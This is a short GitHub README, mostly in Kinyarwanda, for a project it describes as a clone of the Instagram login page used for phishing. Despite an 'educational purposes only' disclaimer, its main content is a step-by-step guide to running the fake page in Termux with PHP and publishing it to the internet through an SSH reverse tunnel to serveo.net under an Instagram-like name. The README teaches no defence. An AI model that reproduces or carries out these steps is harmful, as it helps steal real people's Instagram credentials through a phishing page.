# 2m_drill_hacking-attack-project

## DISCLAIMER

**Izi code ziri muri iri repository zerekana uburyo *phishing* ikora. Ntabwo zigomba gukoreshwa mu buryo bunyuranyije n’amategeko. Ukoresheje izi code nabi azabihanirwa n’amategeko y’u Rwanda ndetse n’andi mategeko mpuzamahanga.**

Iyi project ni iy’amasomo n’ubushakashatsi mu rwego rwo kwigisha uburyo bwo kwirinda *cyber attacks*.

---

## File Overview

### `index.php`  
Clone ya Instagram login page, ikoreshwa mu nyigisho zerekeranye na **phishing techniques**.

---

## UKO IRIKORESHWA  
**(For Educational Purposes Only)**

### 1. Shyira Termux muri Telefoni yawe (Android)

- [Download Termux kuri F-Droid](https://f-droid.org/en/packages/com.termux/)  
- [Download Termux kuri GitHub (Releases)](https://github.com/termux/termux-app/releases)

### 2. Fungura Termux, hanyuma ukore Setup

```bash
pkg update && pkg upgrade
termux-setup-storage
pkg install php
pkg install openssh
pkg install git
git clone https://github.com/2emdrill/2m_drill_hacking-attack-project.git drill
cd drill
php -S 0.0.0.0:8080
'''
3. FUNGURA INDI SESSION MURI TERMUX
```bash
ssh -R Instagramtwozero:80:localhost:8080 serveo.net
 
